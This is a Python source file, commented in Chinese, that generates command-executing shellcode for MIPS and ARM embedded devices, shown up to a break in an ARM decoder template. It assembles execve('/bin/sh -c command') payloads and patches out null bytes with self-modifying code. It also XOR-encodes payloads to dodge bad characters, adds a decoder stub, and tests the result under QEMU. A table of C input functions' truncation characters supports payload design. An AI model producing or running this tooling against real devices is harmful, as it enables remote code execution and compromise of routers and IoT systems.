import shutil
import sys
import os
import subprocess
import argparse
import random
import textwrap
import urllib.parse
from typing import List, Tuple
from pwn import *
import logging



current_user = os.path.expanduser('~')
os.makedirs("shellcode_directory", exist_ok=True)
os.makedirs("tools", exist_ok=True)
# --- 配置交叉编译器 ---
config = {
    "SHELLCODE_DIRECTORY": "shellcode_directory",  # 存放生成的shellcode文件的目录
    "ARM_TOOLCHAIN_PATH": None,
    "MIPS_TOOLCHAIN_PATH": None,
    "QEMU_PATH": None,
    "ARM_PATH": None,
    "DOWNLOAD_MIPS_TOOLCHAIN_URL": "https://toolchains.bootlin.com/downloads/releases/toolchains/mips32/tarballs/mips32--glibc--stable-2024.05-1.tar.xz",
    "DOWNLOAD_MIPSEL_TOOLCHAIN_URL": "https://toolchains.bootlin.com/downloads/releases/toolchains/mips32el/tarballs/mips32el--glibc--stable-2024.05-1.tar.xz",
    "DOWNLOAD_ARMEB_TOOLCHAIN_URL": "https://toolchains.bootlin.com/downloads/releases/toolchains/armebv7-eabihf/tarballs/armebv7-eabihf--uclibc--stable-2024.05-1.tar.xz",
    "DOWNLOAD_ARM_TOOLCHAIN_URL": "https://toolchains.bootlin.com/downloads/releases/toolchains/armv7-eabihf/tarballs/armv7-eabihf--uclibc--stable-2024.05-1.tar.xz",
    "BAD_BYTES": ['00', '3B', '0a', '0b', '0c', '0d', '20', '09']
}

# --- 配置日志记录器 ---
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s",
    filename=f"{config['SHELLCODE_DIRECTORY']}/generate_shellcode.log",
    filemode="a"
)


from typing import List, Dict, Any
import unicodedata

class FunctionTruncationSummary:
    def __init__(self):
        self.summary_data = [
            {
                "函数": "read(0,a,0x100)",
                "截断字符": "EOF",
                "截断属性": "无",
                "截断字符是否保留": "无",
                "截断后": "无"
            },
            {
                "函数": "*a = getchar()",
                "截断字符": "EOF",
                "截断属性": "无",
                "截断字符是否保留": "无",
                "截断后": "无"
            },
            {
                "函数": "scanf(\"%c\",a)",
                "截断字符": "EOF",
                "截断属性": "无",
                "截断字符是否保留": "无",
                "截断后": "无"
            },
            {
                "函数": "scanf(\"%s\",a)",
                "截断字符": "EOF 0x09 0x0A 0x0B 0x0C 0x0D 0x20",
                "截断属性": "截断字符前有有效内容则截断，如无有效内容则跳过截断字符读后面",
                "截断字符是否保留": "不保留",
                "截断后": "0x00"
            },
            {
                "函数": "sscanf(a,\"%s\",b)",
                "截断字符": "0x00 0x09 0x0A 0x0B 0x0C 0x0D 0x20",
                "截断属性": "截断字符前有有效内容则截断，如无有效内容则跳过截断字符读后面",
                "截断字符是否保留": "不保留",
                "截断后": "0x00"
            },
            {
                "函数": "sscanf(a,\"%[^;];\",b)",
                "截断字符": "0x00 0x3B",
                "截断属性": "无",
                "截断字符是否保留": "不保留",
                "截断后": "0x00"
            },
            {
                "函数": "gets(a)",
                "截断字符": "EOF 0x0A",
                "截断属性": "截断字符前无论有无有效内容均截断",
                "截断字符是否保留": "不保留",
                "截断后": "0x00"
            },
            {
                "函数": "fgets(a,256,stdin)",
                "截断字符": "EOF 0x0A",
                "截断属性": "截断字符前无论有无有效内容均截断",
                "截断字符是否保留": "保留",
                "截断后": "0x00"
            },
            {
                "函数": "sprintf(b,\"%s\",a)",
                "截断字符": "0x00",
                "截断属性": "无",
                "截断字符是否保留": "保留",
                "截断后": "无（相当于截断字符不保留，截断后加0x00）"
            },
            {
                "函数": "strcpy(b,a)",
                "截断字符": "0x00",
                "截断属性": "无",
                "截断字符是否保留": "保留",
                "截断后": "无（相当于截断字符不保留，截断后加0x00）"
            },
            {
                "函数": "strcat(b,a)",
                "截断字符": "0x00",
                "截断属性": "无",
                "截断字符是否保留": "保留",
                "截断后": "无（相当于截断字符不保留，截断后加0x00）"
            },
            {
                "函数": "strncat(b,a,0x10)",
                "截断字符": "0x00",
                "截断属性": "无",
                "截断字符是否保留": "保留",
                "截断后": "无（相当于截断字符不保留，截断后加0x00）"
            },
            {
                "函数": "strncat(b,a,0x10)",
                "截断字符": "到达拷贝长度",
                "截断属性": "无",
                "截断字符是否保留": "保留",
                "截断后": "如果到达拷贝长度，则自动补上0x00"
            },
            {
                "函数": "memcpy(b,a,0x10)",
                "截断字符": "",
                "截断属性": "",
                "截断字符是否保留": "",
                "截断后": ""
            }
        ]

    @staticmethod
    def _get_display_width(text: str) -> int:
        return sum(2 if unicodedata.east_asian_width(char) in ('W', 'F') else 1 for char in text)

    def print_summary(self):
        if not self.summary_data:
            print("表格数据为空。")
            return

        headers = list(self.summary_data[0].keys())

        col_widths = {header: self._get_display_width(header) for header in headers}
        for row in self.summary_data:
            for header in headers:
                content = str(row.get(header, ''))
                col_widths[header] = max(col_widths[header], self._get_display_width(content))

        header_line_parts = []
        for header in headers:
            width = col_widths[header]
            padding = width - self._get_display_width(header)
            header_line_parts.append(header + ' ' * padding)
        print(" | ".join(header_line_parts))

        separator_width = sum(col_widths.values()) + (len(headers) - 1)
        print("-" * separator_width)

        for row in self.summary_data:
            row_line_parts = []
            for header in headers:
                content = str(row.get(header, ''))
                width = col_widths[header]
                padding = width - self._get_display_width(content)
                row_line_parts.append(content + ' ' * padding)

            print("|".join(row_line_parts))


class Mips_Generate_short_shellcode:
    ASM_MIPS = """
        .set noreorder
        li      $a2,1638
        bltzal  $a2,0
        slti    $a2,$zero,-1

        addiu   $sp,$sp,-32
        addiu   $s3,$ra,4097
        addiu   $a0,$s3,-3997
        addiu   $a1,$s3,-3989
        addiu   $a2,$s3,-3986

        lw   $t2,-4101($s3)
        lw   $t3,-3993($s3)
        addu   $t3,$t3,$t2
        sw      $t3,-3993($s3)
        lw   $t3,-3989($s3)
        addu   $t3,$t3,$t2
        sw      $t3,-3989($s3)

        lw   $t3,-{offset}($s3)
        addu   $t3,$t3,$t2
        sw      $t3,-{offset}($s3)

        sw      $a0,-24($sp)
        sw		$a1,-20($sp)
        sw      $a2,-16($sp)
        sw      $zero,-12($sp)

        addiu   $a1,$sp,-24
        addiu   $s4,$zero,1111   #将 $a2设置为0
        addiu   $a2,$s4,-1111
        li      $v0,4011
        syscall 0x40404

        # --- 第 4 部分：数据区 ---
        .asciiz "/bin/sh"
        .asciiz "-c"
        .asciiz "{command}"
    """
    def __init__(self, command: str, endian: str, save_file: bool = False):
        self.command = command
        self.endian = endian
        self.save_file = save_file
        self.generate_shellcode(command, endian)

    def generate_shellcode(self, command: str, endian: str):
        try:
            asm_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_test_shellcode.s")
            as_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_test_shellcode.o")
            obj_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_test_shellcode.bin")

            # --- 1、先生成shellcode确认偏移地址 ---
            temp_asm = self.ASM_MIPS.format(command=command, offset=3985)
            with open(asm_file_path, "w") as f:
                f.write(temp_asm)
            subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}as", "-o", as_file_path, asm_file_path], check=True)
            subprocess.run(
                [f"{config['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "--only-section=.text", as_file_path,
                 obj_file_path], check=True)
            with open(obj_file_path, "rb") as f:
                shellcode = f.read()
            # ---获取偏移地址---
            logging.info(f"[START]")
            _, offset = self.strip_trailing_null_blocks(shellcode)
            logging.info(f"[mips] 第一次编译 确认自修复的偏移地址 : {(offset)}")

            # --- 2、传入真实的偏移地址 ---
            temp_asm = self.ASM_MIPS.format(command=command, offset=offset)
            with open(asm_file_path, "w") as f:
                f.write(temp_asm)
            subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}as", "-o", as_file_path, asm_file_path], check=True)
            subprocess.run(
                [f"{config['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "--only-section=.text", as_file_path,
                 obj_file_path], check=True)
            with open(obj_file_path, "rb") as f:
                shellcode = f.read()
            shellcode, _ = self.strip_trailing_null_blocks(shellcode)
            logging.info(f"[mips] 第二次编译 生成 MIPS shellcode : {(shellcode.hex())}")
            modified_shellcode = self.patch_shellcode_segment(shellcode, endian)
            logging.info(f"[mips] patch_shellcode_segment 运算后的 shellcode : {(modified_shellcode.hex())}")
            logging.info(f"[END]")
            print(f"✅ 生成 MIPS shellcode 成功! 长度: {len(modified_shellcode)} 字节")
            print_as_python_bytes(modified_shellcode)
            found, bad_bytes = check_bad_bytes(modified_shellcode)
            print(f"shellcode: 在shellcode中找到坏字节？{found}, 坏字节列表: {bad_bytes}")
            MipsVerifyShellcode(modified_shellcode)

        except FileNotFoundError:
            print(
                f"[!] 错误: MIPS 交叉编译工具链未找到, 请检查 config['MIPS_TOOLCHAIN_PATH'] 的设置: '{config['MIPS_TOOLCHAIN_PATH']}'")
        except subprocess.CalledProcessError as e:
            print(f"[!] 编译失败: {e}")
            if hasattr(e, 'stderr') and e.stderr:
                print(f"错误详情: {e.stderr.decode('utf-8', 'ignore')}")
        finally:
            if self.save_file == False:
                for f in [asm_file_path, as_file_path, obj_file_path]:
                    if os.path.exists(f):
                        os.remove(f)
            else:
                print(f"\n[+] 中间文件已保存:")
                print(f"  - 汇编源码: {asm_file_path}")
                print(f"  - as文件: {as_file_path}")
                print(f"  - objcopy: {obj_file_path}")

    def patch_shellcode_segment(self, shellcode: bytes, endian: str) -> bytes:
        if endian == "big":
            endianness_format = '>I'
        else:
            endianness_format = '<I'
        SUBTRAHEND_VALUE = 0x33333333
        INSERTION_SIZE = 4

        SUBTRAHEND_BYTES = struct.pack(endianness_format, SUBTRAHEND_VALUE)

        logging.info("[mips] --- 阶段 1: 核心修补 (插入和 T1/T2 减法) ---")

        # 定义索引 (针对原始 shellcode)
        S_INSERT_INDEX = 8
        T1_START = 112
        T1_END = 116
        T2_START = 116
        T2_END = 120
        TOTAL_REPLACEMENT_END = T2_END

        required_length = TOTAL_REPLACEMENT_END
        if len(shellcode) < required_length:
            print(
                f"错误: shellcode 长度不足 {required_length} 字节。至少需要 {required_length} 字节。当前长度: {len(shellcode)}")
            return shellcode

        t1_original_bytes = shellcode[T1_START:T1_END]
        t1_original_value, = struct.unpack(endianness_format, t1_original_bytes)
        t1_result_value = t1_original_value - SUBTRAHEND_VALUE
        t1_new_bytes = struct.pack(endianness_format, t1_result_value & 0xFFFFFFFF)

        t2_original_bytes = shellcode[T2_START:T2_END]
        t2_original_value, = struct.unpack(endianness_format, t2_original_bytes)
        t2_result_value = t2_original_value - SUBTRAHEND_VALUE
        t2_new_bytes = struct.pack(endianness_format, t2_result_value & 0xFFFFFFFF)

        T1_T2_new_bytes = t1_new_bytes + t2_new_bytes

        shellcode_stage1 = (
                shellcode[0:S_INSERT_INDEX] +
                SUBTRAHEND_BYTES +
                shellcode[S_INSERT_INDEX:T1_START] +
                T1_T2_new_bytes +
                shellcode[TOTAL_REPLACEMENT_END:]
        )
        segment_size = 4
        null_byte = b'\x00'
        mutable_patch_target = bytearray(shellcode_stage1)
        modified_count = 0
        logging.info("[mips] --- 阶段 2: command 0x00 字节块修补 ---")
        for i in range(0, len(mutable_patch_target), segment_size):
            chunk = mutable_patch_target[i:i + segment_size]
            if len(chunk) != segment_size:
                continue
            if null_byte in chunk:
                current_value, = struct.unpack(endianness_format, chunk)
                new_value = current_value - SUBTRAHEND_VALUE
                new_bytes = struct.pack(endianness_format, new_value & 0xFFFFFFFF)
                logging.info(f"[mips] [PATCHED] 索引 {i:3} 到 {i + 3:3} (原值: 0x{chunk.hex()}) -> 新值: 0x{new_bytes.hex()}")
                mutable_patch_target[i:i + segment_size] = new_bytes
                modified_count += 1
        logging.info(f"[mips] --- command 0x00 字节块处理完成。共修补 {modified_count} 个块。---")
        return bytes(mutable_patch_target)

    def strip_trailing_null_blocks(self, shellcode: bytes) -> bytes:
        block_size = 4
        null_byte = b'\x00'
        start_index = 120
        new_shellcode_list = []
        original_shellcode_len = len(shellcode)
        for i in range(0, original_shellcode_len, block_size):
            chunk = shellcode[i:i + block_size]

            if len(chunk) != block_size:
                new_shellcode_list.append(chunk)
                continue
            if chunk == b'\x00' * block_size:
                logging.info(f"[mips] [REMOVED] 去除全零块，原始起始索引: {i:3}  0x{chunk.hex()}")
            else:
                new_shellcode_list.append(chunk)
        shellcode = b"".join(new_shellcode_list)

        for i in range(start_index, len(shellcode), block_size):
            chunk = shellcode[i:i + block_size]
            if len(chunk) == block_size and null_byte in chunk:
                logging.info(f"[mips] [FOUND] 块索引 {i:3} 包含一个或多个 Null 字节 (内容: 0x{chunk.hex()})")
                offset = (4097 - 112 - (i - 120))
        return shellcode, offset

class MipsShellcodeGenerator:
    ASM_TEMPLATE = """
.section .text
.globl __start
.set noreorder
__start:
    bal     find_data
    nop                 
find_data:
    addu $s0, $ra, 56  
    move $s1, $s0                             
    addiu $s2, $s0, 8                          
    addiu $s3, $s0, 11                         
    addiu $sp, $sp, -16
    sw $s1, 0($sp)     
    sw $s2, 4($sp)     
    sw $s3, 8($sp)     
    sw $zero, 12($sp)   
    move $a0, $s1      
    move $a1, $sp       
    move $a2, $zero    
    li $v0, 4011       
    syscall
.asciiz "/bin/sh"
.asciiz "-c"
.asciiz "{command}"
"""

    def __init__(self, cmd, save_file=False):
        """
        初始化生成器。
        """
        if not cmd:
            raise ValueError("命令不能为空。")
        self.cmd = cmd
        self.save_file = save_file
        self.raw_shellcode = None
        self.generate()

    def generate(self):
        """
        执行编译流程并生成 shellcode。
        """
        final_asm_code = self.ASM_TEMPLATE.format(command=self.cmd)
        try:
            asm_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.s")
            obj_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.o")
            elf_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.elf")
            bin_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.bin")
            # 1. 写入汇编文件
            with open(asm_file_path, "w") as f:
                f.write(final_asm_code)
            # 2. 汇编 (as)
            subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}as", "-o", obj_file_path, asm_file_path], check=True)
            # 3. 链接 (ld)
            subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}ld", "-o", elf_file_path, obj_file_path], check=True)
            # 4. 提取 .text 段 (objcopy)
            subprocess.run([
                f"{config['MIPS_TOOLCHAIN_PATH']}objcopy",
                "-O", "binary",
                "--only-section=.text",
                elf_file_path,
                bin_file_path
            ], check=True)

            # 5. 读取最终的 shellcode
            with open(bin_file_path, "rb") as f:
                self.raw_shellcode = f.read()
        finally:
            # 清理临时文件
            if self.save_file == False:
                for f in [asm_file_path, obj_file_path, elf_file_path, bin_file_path]:
                    if os.path.exists(f):
                        os.remove(f)
            else:
                print(f"\n[+] 中间文件已保存:")
                print(f"  - 汇编文件: {asm_file_path}")
                print(f"  - 目标文件: {obj_file_path}")
                print(f"  - 链接文件: {elf_file_path}")
                print(f"  - 二进制文件: {bin_file_path}")


class MipsShellcodeGenerator_long:
    def __init__(self, cmd, arch, save_file=False):
        self.cmd = cmd
        self.arch = arch
        self.save_file = save_file
        self.xxd_bin_file = None
        self.raw_shellcode = None
        self.generate()

    def generate(self):
        """
        根据指定的架构(arm/mips)和命令生成对应的shellcode。
        """
        asm_code = """
        __asm__ volatile (
            "li $v0, 4011\\n\\t"
            "move $a0, %0\\n\\t"
            "move $a1, %1\\n\\t"
            "li $a2, 0\\n\\t"
            "syscall\\n\\t"
            :
            : "r"(arg0), "r"(args)
            : "$v0", "$a0", "$a1", "$a2"
        );
        """
        # --- 2. 构建完整的C语言源码 ---
        shellcode_c = f"""
    #include <sys/syscall.h>

    void _start() {{
        // 构建 execve 的参数
        {self.format_c_char_array("arg0", "/bin/sh")}
        {self.format_c_char_array("arg1", "-c")}
        {self.format_c_char_array("arg2", self.cmd)}

        char *args[] = {{arg0, arg1, arg2, 0}};

        // 执行特定架构的内联汇编
        {asm_code}
    }}
    """
        # --- 3. 编译并提取二进制代码 ---
        c_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.c")
        elf_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_raw_shellcode")
        bin_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.bin")

        try:
            with open(c_file, "w") as fd:
                fd.write(shellcode_c)
            # 1. 编译C代码为ELF文
            subprocess.run(
                [f"{config['MIPS_TOOLCHAIN_PATH']}gcc", "-fno-stack-protector", "-nostdlib", "-static", "-O0", "-o",
                 elf_file, c_file],
                capture_output=True, text=True
            )
            # 2. 从ELF文件中提取纯二进制的.text段
            subprocess.run(
                [f"{config['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", elf_file, bin_file],
                capture_output=True, text=True
            )
            # 3. 使用objdump查看反汇编结果
            subprocess.run(
                [f"{config['MIPS_TOOLCHAIN_PATH']}objdump", "-D", "-b", "binary", "-m", self.arch.lower(), bin_file],
                capture_output=True, text=True
            )
            # 4. 读取生成的二进制shellcode
            self.xxd_bin_file = subprocess.run(
                ["xxd", "-i", bin_file],
                capture_output=True, text=True
            )
            with open(bin_file, "rb") as fd:
                self.raw_shellcode = fd.read()
        finally:
            # 清理临时文件
            if self.save_file == False:
                for f in [c_file, elf_file, bin_file]:
                    if os.path.exists(f):
                        os.remove(f)
            else:
                print(f"\n[+] 中间文件已保存:")
                print(f"  - C源码: {c_file}")
                print(f"  - ELF文件: {elf_file}")
                print(f"  - 二进制: {bin_file}")

    def format_c_char_array(self, var_name, string):
        """
        将一个Python字符串格式化为C语言的字符数组初始化代码。
        """
        output = []
        length = len(string) + 1
        output.append(f"char {var_name}[{length}];")
        for i, c in enumerate(string):
            if c == "'":
                c_repr = "\\'"
            elif c == '\\':
                c_repr = '\\\\'
            elif c == '\n':
                c_repr = '\\n'
            elif c == '\t':
                c_repr = '\\t'
            else:
                c_repr = c
            output.append(f"{var_name}[{i}] = '{c_repr}';")
        output.append(f"{var_name}[{length - 1}] = '\\0';")
        return "\n".join(output)


class XorEncoder:
    def __init__(self, raw_shellcode, endian, bad_bytes):
        """
        初始化XOR编码器。
        """
        self.raw_shellcode = raw_shellcode
        self.bad_bytes_list = bad_bytes
        self.bad_bytes_set = set(self.bad_bytes_list)
        self.key = None
        self.xor_encoded_shellcode = None
        self.xor_encoded_shellcode_bin_file = os.path.join(config["SHELLCODE_DIRECTORY"],
                                                           "mips_xor_encoded_shellcode.bin")
        print(f"[+] 开始进行XOR编码，处理坏字节...   定义的坏字节: {[hex(b) for b in self.bad_bytes_list]}")
        self.endian = endian

        # --- 2. 立即执行编码流程 ---
        self.generate()

    def _pad_shellcode(self):
        """
        将shellcode填充到4字节的倍数，以进行安全的DWORD操作。
        使用 NOP (0x00) 指令进行填充。
        """
        padding_needed = (4 - len(self.raw_shellcode) % 4) % 4
        padded_shellcode = self.raw_shellcode
        if padding_needed > 0:
            print(f"    -- Shellcode长度不是4的倍数，需要用 NOP 填充 {padding_needed} 字节。")
            # NOP指令的字节表示
            nop_instruction = b'\x00'
            # 检查NOP指令本身是否是坏字节
            if 0x00 in self.bad_bytes_set:
                raise ValueError("填充字节 0x00 是一个坏字节，无法进行填充。请考虑其他填充方案。")
            padded_shellcode += nop_instruction * padding_needed
        return padded_shellcode

    def generate(self):
        """
        循环寻找安全的XOR密钥并加密payload。
        一个安全的密钥及其加密后的shellcode都不应包含任何坏字节。
        """
        padded_shellcode = self._pad_shellcode()

        attempts = 0
        max_attempts = 100000

        while True:
            attempts += 1
            if attempts > max_attempts:
                raise RuntimeError(f"在 {max_attempts} 次尝试后仍未找到安全密钥。请检查坏字节列表或shellcode。")

            # 随机生成一个4字节（32位）的密钥
            key_int = random.randint(1, 0xFFFFFFFF)
            key_bytes = key_int.to_bytes(4, self.endian)

            # 1. 检查密钥本身是否包含坏字节
            if any(b in self.bad_bytes_set for b in key_bytes):
                continue

            # 2. 使用此候选密钥加密整个shellcode
            encoded_buffer = bytearray()
            is_encoded_safe = True
            for i in range(0, len(padded_shellcode), 4):
                chunk = padded_shellcode[i:i + 4]
                dword = int.from_bytes(chunk, self.endian)
                xored_dword_int = dword ^ key_int
                xored_dword_bytes = xored_dword_int.to_bytes(4, self.endian)

                # 3. 检查加密后的块是否包含坏字节
                if any(b in self.bad_bytes_set for b in xored_dword_bytes):
                    is_encoded_safe = False
                    break

                encoded_buffer.extend(xored_dword_bytes)

            if is_encoded_safe:
                self.key = key_int
                self.xor_encoded_shellcode = bytes(encoded_buffer)
                print(f"✅  成功！在 {attempts} 次尝试后找到安全密钥: {hex(self.key)}")
                return


class XorDecoder:
    """
    负责管理解码器模板，并组装最终的shellcode。
    """
    MIPS_DECODER_TEMPLATE = """
    .section .text
    .global __start
    .set noreorder
    __start:
    li $t8, -0x666
    p:
    bltzal $t8, p
    slti $t8, $zero, -1
    li $s1, {val_for_payload_start}
    nor $s1, $s1, $s1
    addu $s1, $ra, $s1
    li $t2, {val_for_loop_count}
    nor $t2, $t2, $t2
    addu $t0, $t2, $t2
    addu $t0, $t0, $t0
    addu $t0, $s1, $t0
    lui $t1, {key_high}
    ori $t1, $t1, {key_low}
    decode_loop:
    lw $t6, -4($t0)
    nor $t5, $t1, $t1
    and $t4, $t6, $t5
    nor $t5, $t6, $t6
    and $t5, $t5, $t1
    or $t4, $t4, $t5
    sw $t4, -4($t0)
    addu $t0, $t0, -4
    addiu $t2, $t2, -1
    bne $t2, $zero, decode_loop
    slti $at, $at, -1
    finished:
    jalr $ra, $s1
    slti $at, $at, -1
    """

    def __init__(self, shellcode, key, save_file=False):
        """
        初始化XOR解码器。
        """
        self.shellcode = shellcode
        self.key = key
        self.val_for_payload_start = None
        self.val_for_loop_count = None
        self.xor_decoded_shellcode_bin_file = os.path.join(config["SHELLCODE_DIRECTORY"],
                                                           "mips_xor_decoded_shellcode.bin")
        self.xor_decoded_shellcode = None
        self.save_file = save_file
        self._decode_len()

    def _decode_len(self):
        key_high = hex(self.key >> 16)
        key_low = hex(self.key & 0xFFFF)
        loop_count = len(self.shellcode) // 4
        val_for_loop_count = -(loop_count + 1)
        temp_asm = self.MIPS_DECODER_TEMPLATE.format(
            val_for_payload_start=-1, val_for_loop_count=-1,
            key_high=key_high, key_low=key_low
        )
        self._generate_decoder(temp_asm, save_file=False)
        offset_to_payload = len(self.xor_decoded_shellcode) - 8
        self.val_for_payload_start = -(offset_to_payload - 3)
        final_asm = self.MIPS_DECODER_TEMPLATE.format(
            val_for_payload_start=self.val_for_payload_start,
            val_for_loop_count=val_for_loop_count,
            key_high=key_high,
            key_low=key_low
        )
        self._generate_decoder(final_asm, save_file=self.save_file)

    def _generate_decoder(self, asm_code, save_file):
        try:
            """编译汇编代码并提取.text节，返回二进制数据和其长度。"""
            s_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_xor_decoder.s")
            o_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_xor_decoder.o")
            bin_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_xor_decoder.bin")
            with open(s_file, "w") as f:
                f.write(asm_code)
            subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}as", "-o", o_file, s_file], capture_output=True)
            subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", o_file, bin_file],
                           capture_output=True)
            with open(bin_file, "rb") as f:
                binary_data = f.read()
                # 在返回前就移除末尾的空字节
                self.xor_decoded_shellcode = binary_data.rstrip(b'\x00')
        finally:
            # 清理临时文件
            if save_file == False:
                for f in [s_file, o_file, bin_file]:
                    if os.path.exists(f):
                        os.remove(f)
            else:
                print(f"\n[+] 中间文件已保存:")
                print(f"  - C源码: {s_file}")
                print(f"  - ELF文件: {o_file}")
                print(f"  - 二进制: {bin_file}")


class Sleep:
    """
    一个独立的类，专门用于生成一段MIPS sleep(0)存根的二进制shellcode。
    这段代码旨在通过强制上下文切换来解决指令缓存(I-Cache)同步问题。
    """

    # MIPS汇编模板 ---
    MIPS_SLEEP_TEMPLATE = """
.section .text
.global __start
.set noreorder

__start:
    bal     get_pc
    nop                         

get_pc:
    addiu   $s1, $ra, 56

    addiu   $sp, $sp, -8
    li      $t0, 3
    sw      $t0, 0($sp)
    sw      $zero, 4($sp)
    move    $a0, $sp
    li      $v0, 4166          
    syscall
    addiu   $sp, $sp, 8

    move    $a0, $s1            
    li      $a1, 1024           
    li      $a2, 1             
    li      $v0, 4147          
    syscall

"""

    def __init__(self, save_file=False, verbose=False):
        """
        初始化Sleep存根生成器。
        """
        self.save_file = save_file
        self.verbose = verbose
        self.bin_file_name = "sleep_stub.bin"
        self.Sleep_shellcode = None
        self.generate()

    def generate(self):
        """
        执行完整的编译流程
        """
        s_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_sleep_shellcode.s")
        o_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_sleep_shellcode.o")
        bin_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_sleep_shellcode.bin")

        # 将汇编模板写入.s文件
        with open(s_file, "w") as f:
            f.write(self.MIPS_SLEEP_TEMPLATE)

        if self.verbose:
            print(f"[Sleep Class] Compiling assembly file: {s_file}")

        # 编译汇编代码为对象文件(.o)
        subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}gcc", "-c", "-nostdlib", "-o", o_file, s_file],
                       capture_output=True, text=True)
        if self.verbose:
            print(f"[Sleep Class] Extracting .text section from {o_file}")
        subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", o_file, bin_file],
                       capture_output=True, text=True)

        # 读取最终的二进制数据
        with open(bin_file, "rb") as fd:
            sleep_shellcode = fd.read()
        self.Sleep_shellcode = sleep_shellcode

        if not self.save_file:
            for f in [s_file, o_file, bin_file]:
                if os.path.exists(f):
                    os.remove(f)



class MipsVerifyShellcode:
    """
    一个用于生成、编译并执行C语言Shellcode测试框架的类。
    """

    def __init__(self, shellcode_bytes):
        """
        初始化生成器。
        """
        if not isinstance(shellcode_bytes, bytes):
            raise TypeError("shellcode_bytes 参数必须是 bytes 类型。")
        self.shellcode_bytes = shellcode_bytes
        self.generate_and_run()

    def _format_shellcode_as_c_string(self):
        """
        将二进制数据格式化为C语言的字符串字面量数组。
        """
        if not self.shellcode_bytes:
            return '    "";'
        c_string_lines = []
        for i in range(0, len(self.shellcode_bytes), 4):
            chunk = self.shellcode_bytes[i:i + 4]
            hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
            c_string_lines.append(f'"{hex_string}"')
        return '\n'.join(c_string_lines) + '\n;'

    def generate_and_run(self):
        """
        生成、编译并执行完整的C语言测试文件。
        """

        # 1.准备C代码前，先格式化shellcode
        formatted_shellcode = self._format_shellcode_as_c_string()
        final_c_code = f"""
        #include <stdio.h>
        #include <string.h>
        #include <sys/mman.h>

        unsigned char shellcode[] =
        {formatted_shellcode}
        int main() {{
            void *exec_mem = mmap(NULL, sizeof(shellcode),
                                  PROT_READ | PROT_WRITE | PROT_EXEC,
                                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

            if (exec_mem == MAP_FAILED) {{
                perror("mmap");
                return 1;
            }}

            memcpy(exec_mem, shellcode, sizeof(shellcode));
            printf("Executing shellcode at address: %p\\\n", exec_mem);

            void (*func)() = (void(*)())exec_mem;
            func();

            munmap(exec_mem, sizeof(shellcode));
            return 0;
        }}
        """

        qemu_path = config['QEMU_PATH']
        c_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_verify_shellcode.c")
        elf_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_verify_shellcode")
        # 2. 写入文件
        try:
            with open(c_file_path, "w") as f:
                f.write(final_c_code)
            print(f"[+] C语言测试文件 '{c_file_path}' 已成功生成。")
        except IOError as e:
            print(f"[-] 错误: 写入文件 '{c_file_path}' 失败: {e}")
            return
        # 3. 编译
        subprocess.run([
            f"{config['MIPS_TOOLCHAIN_PATH']}gcc", "-z", "execstack", "-static", "-g", "-o", elf_file_path,
            c_file_path], capture_output=True, text=True)

        print(f"[+] 编译成功: 可执行文件 '{elf_file_path}'。")
        # 4. 执行
        result = subprocess.run([qemu_path, elf_file_path], capture_output=True, text=True)
        print(result.stdout)
        if result.stderr:
            print(result.stderr)
        if result.returncode == 0:
            print("✅ 验证成功: Shellcode 似乎已成功执行 (QEMU 返回值为 0)。")
        else:
            print(f"[!] 验证警告: Shellcode 执行后 QEMU 返回非零值 ({result.returncode})。可能表示执行中出现问题。")


class ArmShellcodeGenerator:
    """
    一个为 ARM 架构生成 XOR 编码 shellcode 的多功能类。
    """
    EXECVE_TEMPLATE_ARM = """
        .section .text
        .global _start
        .arm
        _start:
            adr r0, shell_strings  
            add r1, r0, #8        
            add r2, r0, #11         
            eor r3, r3, r3         
            sub sp, sp, #16
            str r0, [sp, #0]       
            str r1, [sp, #4]       
            str r2, [sp, #8]       
            str r3, [sp, #12]       
            mov r0, r0              
            mov r1, sp              
            mov r2, r3             
            mov r7, #11             
            svc #0                  

        failed_exec:
            mov r0, #1            
            mov r7, #1             
            svc #0                

        shell_strings:
            .string "/bin/sh"
            .asciz "-c"
            .asciz "{command}"
        """
    DECODER_TEMPLATE_ARM = """
    .section .text
    .global _start
    .arm

    _start:
        adr r4, payload_start
        {key_loader}
        {count_loader}

    decode_loop:
        ldrb r7, [r4, #3]
        lsl r7, r7, #24
        ldrb r8, [r4, #2]
        orr r7, r7, r8, lsl #16
        ldrb r8, [r4, #1]
        orr r7, r7, r8, lsl #8
        add r4, r4, #4              
        ldrb r8, [r4, #-4]         
        sub r4, r4, #4               
        orr r7, r7, r8               
        eor r7, r7, r5              
        strb r7, [r4], #1            
        mov r8, r7, lsr #8
